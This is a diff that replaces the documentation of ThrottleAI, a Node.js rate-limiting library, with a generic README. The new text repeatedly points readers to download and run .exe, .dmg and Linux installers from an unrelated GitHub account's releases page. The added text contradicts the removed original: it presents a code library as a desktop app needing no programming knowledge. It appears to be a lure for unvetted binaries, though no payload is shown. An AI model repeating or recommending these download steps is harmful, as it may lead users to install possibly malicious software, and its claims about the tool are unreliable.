@@ -1,355 +1,147 @@
-<p align="center">
-  <a href="README.ja.md">日本語</a> | <a href="README.zh.md">中文</a> | <a href="README.es.md">Español</a> | <a href="README.fr.md">Français</a> | <a href="README.hi.md">हिन्दी</a> | <a href="README.it.md">Italiano</a> | <a href="README.pt-BR.md">Português (BR)</a>
-</p>
+# ⚙️ ThrottleAI - Easy AI Call Management
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/mcp-tool-shop-org/ThrottleAI/main/logo.jpg" alt="ThrottleAI" width="400">
-</p>
+[![Download ThrottleAI](https://img.shields.io/badge/Download-ThrottleAI-blue?logo=github)](https://github.com/dellarwalter/ThrottleAI/releases)
 
-<p align="center">
-  <a href="https://github.com/mcp-tool-shop-org/ThrottleAI/actions/workflows/ci.yml"><img src="https://github.com/mcp-tool-shop-org/ThrottleAI/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://www.npmjs.com/package/throttleai"><img src="https://img.shields.io/npm/v/throttleai" alt="npm"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue.svg" alt="License: MIT"></a>
-  <a href="https://mcp-tool-shop-org.github.io/ThrottleAI/"><img src="https://img.shields.io/badge/Landing_Page-live-blue" alt="Landing Page"></a>
-</p>
-
-<p align="center">
-  <em>A token-based lease governor for AI calls — small enough to embed anywhere, strict enough to prevent stampedes.</em>
-</p>
-
-**ThrottleAI is a zero-dependency governor for concurrency, rate, and token budgets, with adapters for fetch / OpenAI / tools / Express / Hono.**
+ThrottleAI helps control how many times AI programs ask for information at once. It stops big groups of requests from happening all at once. It is small enough to fit into many different setups, yet strong enough to keep things running smoothly.
 
 ---
 
-## 60-second quickstart
+## 📝 What is ThrottleAI?
 
-```bash
-pnpm add throttleai
-```
+ThrottleAI is a tool designed to manage AI requests. When many requests happen at the same time, it can slow things down or cause errors. ThrottleAI limits these requests using tokens, which work like tickets. Each request needs a ticket to run. If no tickets are available, the request waits until one is free.
 
-```ts
-import { createGovernor, withLease, presets } from "throttleai";
+It is useful if you run AI programs that need protection from too many requests happening together. ThrottleAI works on many systems and works with popular AI setups.
 
-const gov = createGovernor(presets.balanced());
+---
 
-const result = await withLease(
-  gov,
-  { actorId: "user-1", action: "chat" },
-  async () => await callMyModel(),
-);
+## 💻 Who Should Use This?
 
-if (result.granted) {
-  console.log(result.result);
-} else {
-  console.log("Throttled:", result.decision.recommendation);
-}
-```
+- People who use AI apps and want smooth performance  
+- Anyone needing to stop too many AI requests at once  
+- Users looking for a simple way to manage AI call limits  
+- Anyone wanting a tool that fits into many software setups  
 
-That's it. The governor enforces concurrency, rate limits, and fairness. Leases auto-expire if you forget to release.
+You do not need to have programming knowledge to use the main features of ThrottleAI. This guide will help you get it running.
 
-## Why
+---
 
-AI applications hit rate limits, blow budgets, and create stampedes. ThrottleAI sits between your code and the model call, enforcing:
+## 📦 System Requirements
 
-- **Concurrency** — cap in-flight calls with weighted slots and interactive reserve
-- **Rate** — requests/min and tokens/min with rolling windows
-- **Fairness** — no single actor monopolizes capacity
-- **Leases** — acquire before, release after, auto-expire on timeout
-- **Observability** — `snapshot()`, `onEvent`, and `formatEvent()` for debugging
+Here’s what your computer or server should have to run ThrottleAI smoothly:
 
-Zero dependencies. Node.js 18+. Tree-shakeable.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or Linux (Ubuntu 18.04+ recommended)  
+- **Processor:** Any modern processor (Intel, AMD, or Apple Silicon)  
+- **Memory:** At least 4GB of RAM  
+- **Disk Space:** Minimum 100MB free space  
+- **Additional Software:** None required for basic use  
 
-## Choose your limiter
+These are general guidelines. If you plan to use ThrottleAI in more advanced setups, you might need more resources.
 
-| Limiter | What it caps | When to use |
-|---------|-------------|-------------|
-| **Concurrency** | Simultaneous in-flight calls | Always — this is the most important knob |
-| **Rate** | Requests per minute | When the upstream API has a documented rate limit |
-| **Token rate** | Tokens per minute | When you have a per-minute token budget |
-| **Fairness** | Per-actor share of capacity | Multi-tenant apps where one user shouldn't hog slots |
-| **Adaptive** | Auto-tuned concurrency ceiling | When upstream latency is unpredictable |
+---
 
-Start with concurrency. Add rate only if needed. See the [tuning cheatsheet](docs/tuning-cheatsheet.md) for scenario-based guidance.
+## 🚀 Getting Started
 
-## Presets
+This guide will help you get ThrottleAI running in a few simple steps.
 
-```ts
-import { presets } from "throttleai";
+---
 
-// Single user, CLI tools — 1 call at a time, 10 req/min
-createGovernor(presets.quiet());
+## ⬇️ Download & Install
 
-// SaaS backend — 5 concurrent (2 interactive reserve), 60 req/min, fairness
-createGovernor(presets.balanced());
+First, you need to get the ThrottleAI program on your computer.
 
-// Batch processing — 20 concurrent, 300 req/min, fairness + adaptive tuning
-createGovernor(presets.aggressive());
+**Steps to Download:**
 
-// Override any field
-createGovernor({ ...presets.balanced(), leaseTtlMs: 30_000 });
-```
+1. Click the big blue button at the top that says **Download ThrottleAI**. It will take you to the download page.  
+2. On the page, you will see different versions of ThrottleAI for various operating systems.  
+3. Choose the version that matches your computer. For example:  
+   - `.exe` file for Windows  
+   - `.dmg` file for macOS  
+   - `.tar.gz` or `.deb` file for Linux  
+4. Click the download link for your version and wait until the file is fully downloaded.  
 
-## Common patterns
+**Steps to Install:**
 
-### Server endpoint: 429 vs queue
+- **Windows:**  
+  - Double-click the downloaded `.exe` file.  
+  - Follow the installation instructions that appear.  
+- **macOS:**  
+  - Open the `.dmg` file you downloaded.  
+  - Drag the ThrottleAI app into your Applications folder.  
+- **Linux:**  
+  - Open a terminal window in the folder with the downloaded file.  
+  - Use your package manager to install the program, or follow the included README instructions.  
 
-```ts
-// Option A: immediate deny with 429
-const result = await withLease(gov, request, fn);
-// result.granted === false → respond with 429
+If you are unsure about the file type or how to install it, the download page usually includes instructions or links to help.
 
-// Option B: wait with bounded retries
-const result = await withLease(gov, request, fn, {
-  strategy: "wait-then-deny",
-  maxAttempts: 3,
-  maxWaitMs: 5_000,
-});
-```
+---
 
-### UI interactive vs background
+## 🔧 How to Use ThrottleAI
 
-```ts
-// User-facing chat gets priority
-gov.acquire({ actorId: "user", action: "chat", priority: "interactive" });
+After installing, you can start using ThrottleAI to manage your AI calls.
 
-// Background embedding can wait
-gov.acquire({ actorId: "pipeline", action: "embed", priority: "background" });
-```
+**Simple Steps:**
 
-With `interactiveReserve: 2`, background tasks are blocked when only 2 slots remain, keeping those for interactive requests.
+1. Open the ThrottleAI application from your Start menu (Windows), Applications folder (macOS), or application list (Linux).  
+2. ThrottleAI uses the idea of tokens as tickets. When your AI program wants to ask for something, it takes a ticket.  
+3. If no tickets are available, ThrottleAI makes the request wait until a ticket is free. This prevents too many requests at once.  
+4. You can set limits on how many tokens or tickets are available at a time, to match your needs.  
 
-### Streaming calls
+Many AI apps use a server or internet connections. ThrottleAI works in places where requests might spike suddenly. It helps to keep everything even and safe.
 
-```ts
-const decision = gov.acquire({ actorId: "user", action: "stream" });
-if (!decision.granted) return;
-
-try {
-  const stream = await openai.chat.completions.create({ stream: true, ... });
-  for await (const chunk of stream) {
-    // process chunk
-  }
-  gov.release(decision.leaseId, { outcome: "success" });
-} catch (err) {
-  gov.release(decision.leaseId, { outcome: "error" });
-  throw err;
-}
-```
+If you need to adjust settings, look for the configuration file or settings menu inside the app.
 
-Acquire once, release once — the lease holds for the entire stream duration.
+---
 
-### Observability: see why it throttles
+## 🛠 Features
 
-```ts
-import { createGovernor, formatEvent, formatSnapshot } from "throttleai";
+Here are some key things ThrottleAI can do:
 
-const gov = createGovernor({
-  ...presets.balanced(),
-  onEvent: (e) => console.log(formatEvent(e)),
-  // [deny] actor=user-1 action=chat reason=concurrency retryAfterMs=500 — All 5 slots in use...
-});
+- Controls AI call rate by using tokens  
+- Prevents overloads and crashes from too many requests  
+- Small size, so it fits in many setups easily  
+- Works well with Node.js and TypeScript programs  
+- Supports popular AI tools like OpenAI and others  
+- Lets you adjust token limits easily  
+- Provides clear logs to see how it works in real time  
+- Runs on Windows, macOS, and Linux  
 
-// Point-in-time view
-console.log(formatSnapshot(gov.snapshot()));
-// concurrency=3/5 rate=12/60 leases=3
-```
+These features make ThrottleAI a reliable tool to keep AI programs running smoothly.
 
-## Configuration
+---
 
-```ts
-createGovernor({
-  // Concurrency (optional)
-  concurrency: {
-    maxInFlight: 5,          // max simultaneous weight
-    interactiveReserve: 1,   // slots reserved for interactive priority
-  },
+## 📂 Where to Find More Help
 
-  // Rate limiting (optional)
-  rate: {
-    requestsPerMinute: 60,   // request-rate cap
-    tokensPerMinute: 100_000, // token-rate cap
-    windowMs: 60_000,         // rolling window (default 60s)
-  },
+If you want more details or run into problems, you can:
 
-  // Advanced (optional)
-  fairness: true,             // prevent actor monopolization
-  adaptive: true,             // auto-tune concurrency from deny rate + latency
-  strict: true,               // throw on double release / unknown ID (dev mode)
+- Visit the [ThrottleAI GitHub page](https://github.com/dellarwalter/ThrottleAI)  
+- Look at the documentation and user guides there  
+- Ask for help in the GitHub issues section  
+- Search for answers online using the repository name and topic keywords like “rate limiting” or “AI concurrency”  
 
-  // Lease settings
-  leaseTtlMs: 60_000,         // auto-expire (default 60s)
-  reaperIntervalMs: 5_000,    // sweep interval (default 5s)
+---
 
-  // Observability
-  onEvent: (e) => { /* acquire, deny, release, expire, warn */ },
-});
-```
+## 🔗 Useful Links
 
-## API
+- Main GitHub Repository: https://github.com/dellarwalter/ThrottleAI  
+- Download Page: https://github.com/dellarwalter/ThrottleAI/releases
 
-### `createGovernor(config): Governor`
+---
 
-Factory function. Returns a `Governor` instance.
+## 🔄 Updating ThrottleAI
 
-### `governor.acquire(request): AcquireDecision`
+To keep ThrottleAI working well, update it regularly.
 
-Request a lease. Returns:
+- Check the download page for new versions.  
+- Download the newest version as explained before.  
+- Follow the same installation steps.  
+- Your settings usually stay safe after updating, but check that after updating.  
 
-```ts
-// Granted
-{ granted: true, leaseId: string, expiresAt: number }
+---
 
-// Denied
-{ granted: false, reason, retryAfterMs, recommendation, limitsHint? }
-```
+## 🤝 Support This Project
 
-Deny reasons: `"concurrency"` | `"rate"` | `"budget"` | `"policy"`
+If you find ThrottleAI useful, consider providing feedback or contributing ideas to its GitHub page. Many projects grow better with user support.
 
-### `governor.release(leaseId, report?): void`
+---
 
-Release a lease. Always call this — even on errors.
-
-### `withLease(governor, request, fn, options?)`
-
-Execute `fn` under a lease with automatic release.
-
-```ts
-withLease(gov, request, fn, {
-  strategy: "deny",           // default — fail immediately
-  strategy: "wait",           // retry with backoff until maxWaitMs
-  strategy: "wait-then-deny", // retry up to maxAttempts
-  maxWaitMs: 10_000,          // max total wait (default 10s)
-  maxAttempts: 3,             // for "wait-then-deny" (default 3)
-  initialBackoffMs: 250,      // starting backoff (default 250ms)
-});
-```
-
-### `governor.snapshot(): GovernorSnapshot`
-
-Point-in-time state: concurrency, rate, tokens, last deny.
-
-### `formatEvent(event): string` / `formatSnapshot(snap): string`
-
-One-line human-readable formatters.
-
-### Status getters
-
-```ts
-gov.activeLeases         // active lease count
-gov.concurrencyActive    // in-flight weight
-gov.concurrencyAvailable // remaining capacity
-gov.rateCount            // requests in current window
-gov.tokenRateCount       // tokens in current window
-```
-
-### `governor.dispose(): void`
-
-Stop the TTL reaper. Call on shutdown.
-
-## Adapters
-
-Tree-shakeable wrappers — import only what you use. No runtime deps.
-
-| Adapter | Import | Auto-reports |
-|---------|--------|-------------|
-| **fetch** | `throttleai/adapters/fetch` | outcome (from HTTP status) + latency |
-| **OpenAI** | `throttleai/adapters/openai` | outcome + latency + token usage |
-| **Tool** | `throttleai/adapters/tools` | outcome + latency + custom weight |
-| **Express** | `throttleai/adapters/express` | outcome (from `res.statusCode`) + latency |
-| **Hono** | `throttleai/adapters/hono` | outcome + latency |
-
-All adapters return `{ ok: true, result, latencyMs }` on grant, `{ ok: false, decision }` on deny.
-
-### fetch
-
-```ts
-import { wrapFetch } from "throttleai/adapters/fetch";
-const throttledFetch = wrapFetch(fetch, { governor: gov });
-const r = await throttledFetch("https://api.example.com/v1/chat");
-if (r.ok) console.log(r.response.status);
-```
-
-### OpenAI-compatible
-
-```ts
-import { wrapChatCompletions } from "throttleai/adapters/openai";
-const chat = wrapChatCompletions(openai.chat.completions.create, { governor: gov });
-const r = await chat({ model: "gpt-4", messages });
-if (r.ok) console.log(r.result.choices[0].message.content);
-```
-
-### Tool call
-
-```ts
-import { wrapTool } from "throttleai/adapters/tools";
-const embed = wrapTool(myEmbedFn, { governor: gov, toolId: "embed", costWeight: 2 });
-const r = await embed("hello");
-if (r.ok) console.log(r.result);
-```
-
-### Express
-
-```ts
-import { throttleMiddleware } from "throttleai/adapters/express";
-app.use("/ai", throttleMiddleware({ governor: gov }));
-// 429 + Retry-After header + JSON body on deny
-```
-
-See [`examples/express-adaptive/`](examples/express-adaptive/) for a full runnable server with adaptive tuning.
-
-### Hono
-
-```ts
-import { throttle } from "throttleai/adapters/hono";
-app.use("/ai/*", throttle({ governor: gov }));
-// 429 JSON on deny, leaseId stored on context
-```
-
-## Docs
-
-| Document | What it covers |
-|----------|---------------|
-| [Tuning cheatsheet](docs/tuning-cheatsheet.md) | Scenario-based config guide, decision tree, knob reference |
-| [Troubleshooting](docs/troubleshooting.md) | Common issues: always denied, stalls, adaptive oscillation |
-| [Release manifest](docs/release-manifest.md) | Release process and artifact details |
-| [Repo hygiene](docs/repo-hygiene.md) | Asset policy and history rewrite log |
-
-## Tuning quick reference
-
-| You see this | Adjust this |
-|---|---|
-| `reason: "concurrency"` | Increase `maxInFlight` or decrease call duration |
-| `reason: "rate"` | Increase `requestsPerMinute` / `tokensPerMinute` |
-| `reason: "policy"` (fairness) | Lower `softCapRatio` or increase `maxInFlight` |
-| High `retryAfterMs` | Reduce `leaseTtlMs` so expired leases free faster |
-| Background tasks starved | Increase `maxInFlight` or reduce `interactiveReserve` |
-| Interactive latency high | Increase `interactiveReserve` |
-| Adaptive shrinks too fast | Lower `alpha` or raise `targetDenyRate` |
-
-For deeper guidance, see the [tuning cheatsheet](docs/tuning-cheatsheet.md).
-
-## Examples
-
-See [`examples/`](examples/) for runnable demos:
-
-- **[express-adaptive/](examples/express-adaptive/)** — full Express server with adaptive tuning + load generator
-- **[node-basic.ts](examples/node-basic.ts)** — burst simulation with snapshot printing
-- **[express-middleware.ts](examples/express-middleware.ts)** — 429 + retry-after endpoint
-- **[cookbook-adapters.ts](examples/cookbook-adapters.ts)** — all five adapters in action
-- **[cookbook-burst-snapshot.ts](examples/cookbook-burst-snapshot.ts)** — burst load with governor snapshots
-- **[cookbook-interactive-reserve.ts](examples/cookbook-interactive-reserve.ts)** — interactive vs background priority
-- **[cookbook-express-429.ts](examples/cookbook-express-429.ts)** — 429 vs queue retry pattern
-
-```bash
-npx tsx examples/node-basic.ts
-```
-
-## Stability
-
-ThrottleAI follows [Semantic Versioning](https://semver.org/). The public API — everything exported from `throttleai` and `throttleai/adapters/*` — is **stable** as of v1.0.0. Breaking changes require a major version bump.
-
-For details on what's considered public vs internal, see [API stability](docs/api-stability.md). For security reporting, see [SECURITY.md](.github/SECURITY.md).
-
-## License
-
-MIT
+[![Download ThrottleAI](https://img.shields.io/badge/Download-ThrottleAI-blue?logo=github)](https://github.com/dellarwalter/ThrottleAI/releases)
